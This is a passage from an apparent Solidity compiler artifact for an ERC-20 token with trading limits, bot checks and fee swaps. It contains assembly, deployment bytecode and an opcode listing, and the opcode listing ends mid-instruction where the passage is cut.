\"#utility.yul\":12895:12896   */\n      dup2\n        /* \"#utility.yul\":12892:12905   */\n      lt\n        /* \"#utility.yul\":12884:13079   */\n      iszero\n      tag_458\n      jumpi\n        /* \"#utility.yul\":12963:12976   */\n      dup5\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"#utility.yul\":12959:12998   */\n      and\n        /* \"#utility.yul\":12947:12999   */\n      dup4\n      mstore\n        /* \"#utility.yul\":13054:13069   */\n      swap4\n      dup4\n      add\n      swap4\n        /* \"#utility.yul\":13019:13031   */\n      swap2\n      dup4\n      add\n      swap2\n        /* \"#utility.yul\":12995:12996   */\n      0x01\n        /* \"#utility.yul\":12913:12922   */\n      add\n        /* \"#utility.yul\":12884:13079   */\n      jump(tag_456)\n    tag_458:\n      pop\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"#utility.yul\":13135:13167   */\n      swap7\n      swap1\n      swap7\n      and\n        /* \"#utility.yul\":13130:13132   */\n      0x60\n        /* \"#utility.yul\":13115:13133   */\n      dup6\n      add\n        /* \"#utility.yul\":13108:13168   */\n      mstore\n      pop\n      pop\n      pop\n        /* \"#utility.yul\":13199:13202   */\n      0x80\n        /* \"#utility.yul\":13184:13203   */\n      add\n        /* \"#utility.yul\":13177:13212   */\n      mstore\n        /* \"#utility.yul\":13096:13099   */\n      swap4\n        /* \"#utility.yul\":12238:13218   */\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":13223:13440   */\n    tag_342:\n        /* \"#utility.yul\":13263:13264   */\n      0x00\n        /* \"#utility.yul\":13289:13290   */\n      dup3\n        /* \"#utility.yul\":13279:13411   */\n      tag_460\n      jumpi\n        /* \"#utility.yul\":13333:13343   */\n      0x4e487b71\n        /* \"#utility.yul\":13328:13331   */\n      0xe0\n        /* \"#utility.yul\":13324:13344   */\n      shl\n        /* \"#utility.yul\":13321:13322   */\n      0x00\n        /* \"#utility.yul\":13314:13345   */\n      mstore\n        /* \"#utility.yul\":13368:13372   */\n      0x12\n        /* \"#utility.yul\":13365:13366   */\n      0x04\n        /* \"#utility.yul\":13358:13373   */\n      mstore\n        /* \"#utility.yul\":13396:13400   */\n      0x24\n        /* \"#utility.yul\":13393:13394   */\n      0x00\n        /* \"#utility.yul\":13386:13401   */\n      revert\n        /* \"#utility.yul\":13279:13411   */\n    tag_460:\n      pop\n        /* \"#utility.yul\":13425:13434   */\n      div\n      swap1\n        /* \"#utility.yul\":13223:13440   */\n      jump\t// out\n    stop\n    data_974d1b4421da69cc60b481194f0dad36a5bb4e23da810da7a7fb30cdba178330 45524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e6365\n\n    auxdata: 0xa2646970667358221220b04c90781db138d74317e588f23795e39a5a76c9acad7daa0be50820df76362b64736f6c63430008180033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "6080604052600f600755600f60085560006009556000600a55604b600b55604b600c55601e600d556000600e556012600a6200003c919062000793565b6200004c906301312d00620007ab565b600f556200005d6012600a62000793565b6200006d906301312d00620007ab565b6010556200007e6012600a62000793565b6200008c90614e20620007ab565b6011556200009d6012600a62000793565b620000ac90622dc6c0620007ab565b6012556014805461ffff60a81b19169055348015620000ca57600080fd5b506040516200224d3803806200224d833981016040819052620000ed9162000806565b600080546001600160a01b031916339081178255604051909182917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0908290a350600580546001600160a01b0319166001600160a01b038416179055620001576012600a62000793565b6200016790633b9aca00620007ab565b306000908152600160208190526040822092909255600390620001926000546001600160a01b031690565b6001600160a01b03908116825260208083019390935260409182016000908120805495151560ff19968716179055308082526003909452828120805486166001908117909155600554909216815291909120805490931617909155601380546001600160a01b031916737a250d5630b4cf539739df2c5dacb4c659f2488d9081179091556200024091906200022a6012600a62000793565b6200023a90633b9aca00620007ab565b620004ae565b601360009054906101000a90046001600160a01b03166001600160a01b031663c45a01556040518163ffffffff1660e01b8152600401602060405180830381865afa15801562000294573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620002ba9190620008f1565b6001600160a01b031663c9c6539630601360009054906101000a90046001600160a01b03166001600160a01b031663ad5c46486040518163ffffffff1660e01b8152600401602060405180830381865afa1580156200031d573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620003439190620008f1565b6040516001600160e01b031960e085901b1681526001600160a01b039283166004820152911660248201526044016020604051808303816000875af115801562000391573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620003b79190620008f1565b601480546001600160a01b0319166001600160a01b0392831690811790915560135460405163095ea7b360e01b81529216600483015260001960248301529063095ea7b3906044016020604051808303816000875af11580156200041f573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062000445919062000911565b503360007fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef620004786012600a62000793565b6200048890633b9aca00620007ab565b60405190815260200160405180910390a3620004a6600082620005da565b505062000967565b6001600160a01b038316620005165760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b60648201526084015b60405180910390fd5b6001600160a01b038216620005795760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b60648201526084016200050d565b6001600160a01b0383811660008181526002602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b80518210156200067a576000818381518110620005fb57620005fb62000935565b6020908102919091018101516001600160a01b038116600090815260039092526040909120805460ff1916600117905590506200063b6012600a62000793565b6200064b906301312d00620007ab565b6001600160a01b0382166000908152600460205260409020558262000670816200094b565b93505050620005da565b5050565b634e487b7160e01b600052601160045260246000fd5b600181815b80851115620006d5578160001904821115620006b957620006b96200067e565b80851615620006c757918102915b93841c939080029062000699565b509250929050565b600082620006ee575060016200078d565b81620006fd575060006200078d565b8160018114620007165760028114620007215762000741565b60019150506200078d565b60ff8411156200073557620007356200067e565b50506001821b6200078d565b5060208310610133831016604e8410600b841016171562000766575081810a6200078d565b62000772838362000694565b80600019048211156200078957620007896200067e565b0290505b92915050565b6000620007a460ff841683620006dd565b9392505050565b80820281158282048414176200078d576200078d6200067e565b6001600160a01b0381168114620007db57600080fd5b50565b634e487b7160e01b600052604160045260246000fd5b80516200080181620007c5565b919050565b600080604083850312156200081a57600080fd5b82516200082781620007c5565b602084810151919350906001600160401b03808211156200084757600080fd5b818601915086601f8301126200085c57600080fd5b815181811115620008715762000871620007de565b8060051b604051601f19603f83011681018181108582111715620008995762000899620007de565b604052918252848201925083810185019189831115620008b857600080fd5b938501935b82851015620008e157620008d185620007f4565b84529385019392850192620008bd565b8096505050505050509250929050565b6000602082840312156200090457600080fd5b8151620007a481620007c5565b6000602082840312156200092457600080fd5b81518015158114620007a457600080fd5b634e487b7160e01b600052603260045260246000fd5b6000600182016200096057620009606200067e565b5060010190565b6118d680620009776000396000f3fe60806040526004361061012e5760003560e01c80637d1db4a5116100ab578063a9059cbb1161006f578063a9059cbb14610313578063b70143c914610333578063bf474bed14610353578063c9567bf914610369578063dd62ed3e1461037e578063e9e1831a146103c457600080fd5b80637d1db4a5146102b55780638da5cb5b146102cb5780638f9a55c0146102e957806395d89b411461013a5780639c7b9b7f146102ff57600080fd5b8063313ce567116100f2578063313ce567146101ff5780633ccfd60b1461021b57806349bd5a5e1461023257806370a082311461026a578063715018a6146102a057600080fd5b806306fdde031461013a578063095ea7b3146101765780630faee56f146101a657806318160ddd146101ca57806323b872dd146101df57600080fd5b3661013557005b600080fd5b34801561014657600080fd5b506040805180820182526004815263151154d560e21b6020820152905161016d91906114ae565b60405180910390f35b34801561018257600080fd5b50610196610191366004611512565b6103cc565b604051901515815260200161016d565b3480156101b257600080fd5b506101bc60125481565b60405190815260200161016d565b3480156101d657600080fd5b506101bc6103e3565b3480156101eb57600080fd5b506101966101fa36600461153e565b610404565b34801561020b57600080fd5b506040516012815260200161016d565b34801561022757600080fd5b5061023061046d565b005b34801561023e57600080fd5b50601454610252906001600160a01b031681565b6040516001600160a01b03909116815260200161016d565b34801561027657600080fd5b506101bc61028536600461157f565b6001600160a01b031660009081526001602052604090205490565b3480156102ac57600080fd5b50610230610585565b3480156102c157600080fd5b506101bc600f5481565b3480156102d757600080fd5b506000546001600160a01b0316610252565b3480156102f557600080fd5b506101bc60105481565b34801561030b57600080fd5b5033316101bc565b34801561031f57600080fd5b5061019661032e366004611512565b6105f9565b34801561033f57600080fd5b5061023061034e36600461159c565b610606565b34801561035f57600080fd5b506101bc60115481565b34801561037557600080fd5b5061023061068c565b34801561038a57600080fd5b506101bc6103993660046115b5565b6001600160a01b03918216600090815260026020908152604080832093909416825291909152205490565b61023061072d565b60006103d9338484610830565b5060015b92915050565b60006103f16012600a6116e8565b6103ff90633b9aca006116f7565b905090565b6000610411848484610954565b610463843361045e85604051806060016040528060288152602001611879602891396001600160a01b038a1660009081526002602090815260408083203384529091529020549190611089565b610830565b5060019392505050565b6000546001600160a01b031633146104a05760405162461bcd60e51b81526004016104979061170e565b60405180910390fd5b601454600160a01b900460ff16156104fa5760405162461bcd60e51b815260206004820152601f60248201527f54726164696e672068617320616c7265616479206265656e206f70656e6564006044820152606401610497565b47806105485760405162461bcd60e51b815260206004820152601b60248201527f436f6e747261637420686173206e6f204554482062616c616e636500000000006044820152606401610497565b600080546040516001600160a01b039091169183156108fc02918491818181858888f19350505050158015610581573d6000803e3d6000fd5b5050565b6000546001600160a01b031633146105af5760405162461bcd60e51b81526004016104979061170e565b600080546040516001600160a01b03909116907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0908390a3600080546001600160a01b0319169055565b60006103d9338484610954565b6005546001600160a01b0316336001600160a01b03161461062657600080fd5b3060009081526001602052604090205481111580156106455750600081115b6106805760405162461bcd60e51b815260206004820152600c60248201526b15dc9bdb99c8185b5bdd5b9d60a21b6044820152606401610497565b610689816110c3565b50565b6000546001600160a01b031633146106b65760405162461bcd60e51b81526004016104979061170e565b601454600160a01b900460ff16156107105760405162461bcd60e51b815260206004820152601760248201527f54726164696e6720697320616c7265616479206f70656e0000000000000000006044820152606401610497565b6014805462ff00ff60a01b19166201000160a01b17905543600655565b6000546001600160a01b031633146107575760405162461bcd60e51b81526004016104979061170e565b6013546001600160a01b031663f305d7193430610789816001600160a01b031660009081526001602052604090205490565b60008061079e6000546001600160a01b031690565b60405160e088901b6001600160e01b03191681526001600160a01b03958616600482015260248101949094526044840192909252606483015290911660848201524260a482015260c40160606040518083038185885af1158015610806573d6000803e3d6000fd5b50505050506040513d601f19601f8201168201806040525081019061082b9190611743565b505050565b6001600160a01b0383166108925760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b6064820152608401610497565b6001600160a01b0382166108f35760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b6064820152608401610497565b6001600160a01b0383811660008181526002602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b6001600160a01b0383166109b85760405162461bcd60e51b815260206004820152602560248201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604482015264647265737360d81b6064820152608401610497565b6001600160a01b038216610a1a5760405162461bcd60e51b815260206004820152602360248201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260448201526265737360e81b6064820152608401610497565b60008111610a7c5760405162461bcd60e51b815260206004820152602960248201527f5472616e7366657220616d6f756e74206d7573742062652067726561746572206044820152687468616e207a65726f60b81b6064820152608401610497565b601454600160a01b900460ff16610aea576000546001600160a01b03848116911614610aea5760405162461bcd60e51b815260206004820152601760248201527f54726164696e67206e6f7420656e61626c6564207965740000000000000000006044820152606401610497565b600080600654118015610b095750600654610b0690600a611771565b43115b15610b1657610b1661123d565b6000546001600160a01b03858116911614801590610b4257506000546001600160a01b03848116911614155b15610f4657610b736064610b6d600b54600e5411610b6257600754610b66565b6009545b85906112c5565b9061134e565b6014549091506001600160a01b038581169116148015610ba157506013546001600160a01b03848116911614155b15610d9e574360065403610c99576001600160a01b03831660009081526003602052604090205460ff16610c2b5760405162461bcd60e51b815260206004820152602b60248201527f426f74206164647265737365732063616e6e6f742062757920696e207468652060448201526a666972737420626c6f636b60a81b6064820152608401610497565b610c376012600a6116e8565b610c45906301312d006116f7565b821115610c945760405162461bcd60e51b815260206004820152601a60248201527f457863656564732074686520737761705468726573686f6c642e0000000000006044820152606401610497565b610d88565b600f54821115610ceb5760405162461bcd60e51b815260206004820152601860248201527f4578636565647320746865206d61785478416d6f756e742e00000000000000006044820152606401610497565b60105482610d0e856001600160a01b031660009081526001602052604090205490565b610d189190611771565b1115610d665760405162461bcd60e51b815260206004820152601a60248201527f4578636565647320746865206d617857616c6c657453697a652e0000000000006044820152606401610497565b436006546003610d769190611771565b1115610d8857823b15610d8857600080fd5b600e8054906000610d9883611784565b91905055505b6014546001600160a01b03848116911614801590610dd557506001600160a01b03831660009081526003602052604090205460ff16155b15610e555760105482610dfd856001600160a01b031660009081526001602052604090205490565b610e079190611771565b1115610e555760405162461bcd60e51b815260206004820152601a60248201527f4578636565647320746865206d617857616c6c657453697a652e0000000000006044820152606401610497565b6014546001600160a01b038481169116148015610e7b57506001600160a01b0384163014155b15610ea857610ea56064610b6d600c54600e5411610e9b57600854610b66565b600a5485906112c5565b90505b30600090815260016020526040902054601454600160a81b900460ff16158015610edf57506014546001600160a01b038581169116145b8015610ef45750601454600160b01b900460ff165b8015610f01575060115481115b8015610f105750600d54600e54115b15610f4457610f32610f2d84610f2884601254611390565b611390565b6110c3565b478015610f4257610f42476113a5565b505b505b8015610fc05730600090815260016020526040902054610f6690826113df565b30600081815260016020526040908190209290925590516001600160a01b038616907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef90610fb79085815260200190565b60405180910390a35b6001600160a01b038416600090815260016020526040902054610fe3908361143e565b6001600160a01b038516600090815260016020526040902055611028611009838361143e565b6001600160a01b038516600090815260016020526040902054906113df565b6001600160a01b0380851660008181526001602052604090209290925585167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef611072858561143e565b60405190815260200160405180910390a350505050565b600081848411156110ad5760405162461bcd60e51b815260040161049791906114ae565b5060006110ba848661179d565b95945050505050565b6014805460ff60a81b1916600160a81b179055604080516002808252606082018352600092602083019080368337019050509050308160008151811061110b5761110b6117b0565b6001600160a01b03928316602091820292909201810191909152601354604080516315ab88c960e31b81529051919093169263ad5c46489260048083019391928290030181865afa158015611164573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061118891906117c6565b8160018151811061119b5761119b6117b0565b6001600160a01b0392831660209182029290920101526013546111c19130911684610830565b60135460405163791ac94760e01b81526001600160a01b039091169063791ac947906111fa9085906000908690309042906004016117e3565b600060405180830381600087803b15801561121457600080fd5b505af1158015611228573d6000803e3d6000fd5b50506014805460ff60a81b1916905550505050565b6112496012600a6116e8565b61125790633b9aca006116f7565b600f556112666012600a6116e8565b61127490633b9aca006116f7565b6010557f947f344d56e1e8c70dc492fb94c4ddddd490c016aab685f5e7e47b2e85cb44cf6112a46012600a6116e8565b6112b290633b9aca006116f7565b60405190815260200160405180910390a1565b6000826000036112d7575060006103dd565b60006112e383856116f7565b9050826112f08583611856565b146113475760405162461bcd60e51b815260206004820152602160248201527f536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f6044820152607760f81b6064820152608401610497565b9392505050565b600061134783836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f000000000000815250611480565b600081831161139f5782611347565b50919050565b6005546040516001600160a01b039091169082156108fc029083906000818181858888f19350505050158015610581573d6000803e3d6000fd5b6000806113ec8385611771565b9050838110156113475760405162461bcd60e51b815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f7700000000006044820152606401610497565b600061134783836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f770000815250611089565b600081836114a15760405162461bcd60e51b815260040161049791906114ae565b5060006110ba8486611856565b60006020808352835180602085015260005b818110156114dc578581018301518582016040015282016114c0565b506000604082860101526040601f19601f8301168501019250505092915050565b6001600160a01b038116811461068957600080fd5b6000806040838503121561152557600080fd5b8235611530816114fd565b946020939093013593505050565b60008060006060848603121561155357600080fd5b833561155e816114fd565b9250602084013561156e816114fd565b929592945050506040919091013590565b60006020828403121561159157600080fd5b8135611347816114fd565b6000602082840312156115ae57600080fd5b5035919050565b600080604083850312156115c857600080fd5b82356115d3816114fd565b915060208301356115e3816114fd565b809150509250929050565b634e487b7160e01b600052601160045260246000fd5b600181815b8085111561163f578160001904821115611625576116256115ee565b8085161561163257918102915b93841c9390800290611609565b509250929050565b600082611656575060016103dd565b81611663575060006103dd565b816001811461167957600281146116835761169f565b60019150506103dd565b60ff841115611694576116946115ee565b50506001821b6103dd565b5060208310610133831016604e8410600b84101617156116c2575081810a6103dd565b6116cc8383611604565b80600019048211156116e0576116e06115ee565b029392505050565b600061134760ff841683611647565b80820281158282048414176103dd576103dd6115ee565b6020808252818101527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604082015260600190565b60008060006060848603121561175857600080fd5b8351925060208401519150604084015190509250925092565b808201808211156103dd576103dd6115ee565b600060018201611796576117966115ee565b5060010190565b818103818111156103dd576103dd6115ee565b634e487b7160e01b600052603260045260246000fd5b6000602082840312156117d857600080fd5b8151611347816114fd565b600060a08201878352602087602085015260a0604085015281875180845260c08601915060208901935060005b818110156118355784516001600160a01b031683529383019391830191600101611810565b50506001600160a01b03969096166060850152505050608001529392505050565b60008261187357634e487b7160e01b600052601260045260246000fd5b50049056fe45524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e6365a2646970667358221220b04c90781db138d74317e588f23795e39a5a76c9acad7daa0be50820df76362b64736f6c63430008180033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0xF PUSH1 0x7 SSTORE PUSH1 0xF PUSH1 0x8 SSTORE PUSH1 0x0 PUSH1 0x9 SSTORE PUSH1 0x0 PUSH1 0xA SSTORE PUSH1 0x4B PUSH1 0xB SSTORE PUSH1 0x4B PUSH1 0xC SSTORE PUSH1 0x1E PUSH1 0xD SSTORE PUSH1 0x0 PUSH1 0xE SSTORE PUSH1 0x12 PUSH1 0xA PUSH3 0x3C SWAP2 SWAP1 PUSH3 0x793 JUMP JUMPDEST PUSH3 0x4C SWAP1 PUSH4 0x1312D00 PUSH3 0x7AB JUMP JUMPDEST PUSH1 0xF SSTORE PUSH3 0x5D PUSH1 0x12 PUSH1 0xA PUSH3 0x793 JUMP JUMPDEST PUSH3 0x6D SWAP1 PUSH4 0x1312D00 PUSH3 0x7AB JUMP JUMPDEST PUSH1 0x10 SSTORE PUSH3 0x7E PUSH1 0x12 PUSH1 0xA PUSH3 0x793 JUMP JUMPDEST PUSH3 0x8C SWAP1 PUSH2 0x4E20 PUSH3 0x7AB JUMP JUMPDEST PUSH1 0x11 SSTORE PUSH3 0x9D PUSH1 0x12 PUSH1 0xA PUSH3 0x793 JUMP JUMPDEST PUSH3 0xAC SWAP1 PUSH3 0x2DC6C0 PUSH3 0x7AB JUMP JUMPDEST PUSH1 0x12 SSTORE PUSH1 0x14 DUP1 SLOAD PUSH2 0xFFFF PUSH1 0xA8 SHL NOT AND SWAP1 SSTORE CALLVALUE DUP1 ISZERO PUSH3 0xCA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH3 0x224D CODESIZE SUB DUP1 PUSH3 0x224D DUP4 CODECOPY DUP2 ADD PUSH1 0x40 DUP2 SWAP1 MSTORE PUSH3 0xED SWAP2 PUSH3 0x806 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND CALLER SWAP1 DUP2 OR DUP3 SSTORE PUSH1 0x40 MLOAD SWAP1 SWAP2 DUP3 SWAP2 PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 SWAP1 DUP3 SWAP1 LOG3 POP PUSH1 0x5 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND OR SWAP1 SSTORE PUSH3 0x157 PUSH1 0x12 PUSH1 0xA PUSH3 0x793 JUMP JUMPDEST PUSH3 0x167 SWAP1 PUSH4 0x3B9ACA00 PUSH3 0x7AB JUMP JUMPDEST ADDRESS PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 DUP2 SWAP1 MSTORE PUSH1 0x40 DUP3 KECCAK256 SWAP3 SWAP1 SWAP3 SSTORE PUSH1 0x3 SWAP1 PUSH3 0x192 PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 DUP2 AND DUP3 MSTORE PUSH1 0x20 DUP1 DUP4 ADD SWAP4 SWAP1 SWAP4 MSTORE PUSH1 0x40 SWAP2 DUP3 ADD PUSH1 0x0 SWAP1 DUP2 KECCAK256 DUP1 SLOAD SWAP6 ISZERO ISZERO PUSH1 0xFF NOT SWAP7 DUP8 AND OR SWAP1 SSTORE ADDRESS DUP1 DUP3 MSTORE PUSH1 0x3 SWAP1 SWAP5 MSTORE DUP3 DUP2 KECCAK256 DUP1 SLOAD DUP7 AND PUSH1 0x1 SWAP1 DUP2 OR SWAP1 SWAP2 SSTORE PUSH1 0x5 SLOAD SWAP1 SWAP3 AND DUP2 MSTORE SWAP2 SWAP1 SWAP2 KECCAK256 DUP1 SLOAD SWAP1 SWAP4 AND OR SWAP1 SWAP2 SSTORE PUSH1 0x13 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND PUSH20 0x7A250D5630B4CF539739DF2C5DACB4C659F2488D SWAP1 DUP2 OR SWAP1 SWAP2 SSTORE PUSH3 0x240 SWAP2 SWAP1 PUSH3 0x22A PUSH1 0x12 PUSH1 0xA PUSH3 0x793 JUMP JUMPDEST PUSH3 0x23A SWAP1 PUSH4 0x3B9ACA00 PUSH3 0x7AB JUMP JUMPDEST PUSH3 0x4AE JUMP JUMPDEST PUSH1 0x13 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0xC45A0155 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH3 0x294 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH3 0x2BA SWAP2 SWAP1 PUSH3 0x8F1 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0xC9C65396 ADDRESS PUSH1 0x13 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0xAD5C4648 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH3 0x31D JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH3 0x343 SWAP2 SWAP1 PUSH3 0x8F1 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB NOT PUSH1 0xE0 DUP6 SWAP1 SHL AND DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP3 DUP4 AND PUSH1 0x4 DUP3 ADD MSTORE SWAP2 AND PUSH1 0x24 DUP3 ADD MSTORE PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH3 0x391 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH3 0x3B7 SWAP2 SWAP1 PUSH3 0x8F1 JUMP JUMPDEST PUSH1 0x14 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP3 DUP4 AND SWAP1 DUP2 OR SWAP1 SWAP2 SSTORE PUSH1 0x13 SLOAD PUSH1 0x40 MLOAD PUSH4 0x95EA7B3 PUSH1 0xE0 SHL DUP2 MSTORE SWAP3 AND PUSH1 0x4 DUP4 ADD MSTORE PUSH1 0x0 NOT PUSH1 0x24 DUP4 ADD MSTORE SWAP1 PUSH4 0x95EA7B3 SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH3 0x41F JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH3 0x445 SWAP2 SWAP1 PUSH3 0x911 JUMP JUMPDEST POP CALLER PUSH1 0x0 PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF PUSH3 0x478 PUSH1 0x12 PUSH1 0xA PUSH3 0x793 JUMP JUMPDEST PUSH3 0x488 SWAP1 PUSH4 0x3B9ACA00 PUSH3 0x7AB JUMP JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 PUSH3 0x4A6 PUSH1 0x0 DUP3 PUSH3 0x5DA JUMP JUMPDEST POP POP PUSH3 0x967 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH3 0x516 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x24 DUP1 DUP3 ADD MSTORE PUSH32 0x45524332303A20617070726F76652066726F6D20746865207A65726F20616464 PUSH1 0x44 DUP3 ADD MSTORE PUSH4 0x72657373 PUSH1 0xE0 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH3 0x579 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x22 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A20617070726F766520746F20746865207A65726F206164647265 PUSH1 0x44 DUP3 ADD MSTORE PUSH2 0x7373 PUSH1 0xF0 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH3 0x50D JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 DUP2 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 DUP8 AND DUP1 DUP5 MSTORE SWAP5 DUP3 MSTORE SWAP2 DUP3 SWAP1 KECCAK256 DUP6 SWAP1 SSTORE SWAP1 MLOAD DUP5 DUP2 MSTORE PUSH32 